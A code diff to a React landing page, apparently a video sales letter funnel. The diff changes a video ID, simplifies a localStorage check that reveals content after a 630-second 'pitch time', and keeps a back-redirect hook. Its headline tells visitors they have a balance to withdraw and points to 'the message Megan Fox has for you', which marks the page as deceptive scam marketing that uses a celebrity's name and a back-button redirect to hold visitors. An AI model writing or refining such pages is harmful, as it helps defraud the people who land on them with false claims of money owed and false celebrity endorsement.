@@ -26,33 +26,22 @@ export default function Page({
 
   // SET CONTENT DATA
   const VSL = VSLBlackMegan;
-  const videoId = "69359e4d9f9c59a190d01503";
-  const content = userLayerData.content;
-  const backLink = `https://${userHost}/promo?src=${content}`;
+  const videoId = "68deddf0d033c20b201de72c";
+  const backLink = `https://${userHost}/promo`;
   const pitchTime = 630;
 
   // VIDEO VERIFY
   useEffect(() => {
     if (!visible) {
       const intervalId = setInterval(() => {
-        const storedValue = localStorage.getItem(videoId + '-resume');
-        if (!storedValue) return;
-        
-        const storedVideoTime = Number(storedValue);
-        if (isNaN(storedVideoTime) || storedVideoTime <= 0) return;
-        
-        // Se o valor for maior que 60000, provavelmente está em milissegundos (mais de 1 minuto em ms)
-        // Converte para segundos dividindo por 1000
-        const videoTimeInSeconds = storedVideoTime > 60000 ? storedVideoTime / 1000 : storedVideoTime;
-        
-        // Verifica se o tempo realmente passou do pitchTime (usa > ao invés de >= para garantir que passou)
-        if (videoTimeInSeconds > pitchTime) {
+        const storedVideoTime = Number(localStorage.getItem(videoId + '-resume'));
+        if (storedVideoTime > pitchTime) {
           setVisible(true);
         };
       }, 1000);
       return () => clearInterval(intervalId);
     };
-  }, [videoId, visible, pitchTime]);
+  }, [videoId, visible]);
 
   // BACK REDIRECT
   useEffect(() => {
@@ -80,7 +69,7 @@ export default function Page({
     <>
       <div className="flex flex-col text-center text-sm rounded-3xl gap-5 bg-gradient-to-t appear border-t px-4 py-6 from-gray-50 to-gray-200/50 border-gray-300">
         <span className="text-base sm:text-2xl font-semibold text-balance tracking-tight">
-          There is very little time left to withdraw your available balance. 👇
+          See the message Megan Fox has for you to withdraw your balance! 👇
         </span>
         <PlacesAlert visible={visible} />
       </div>
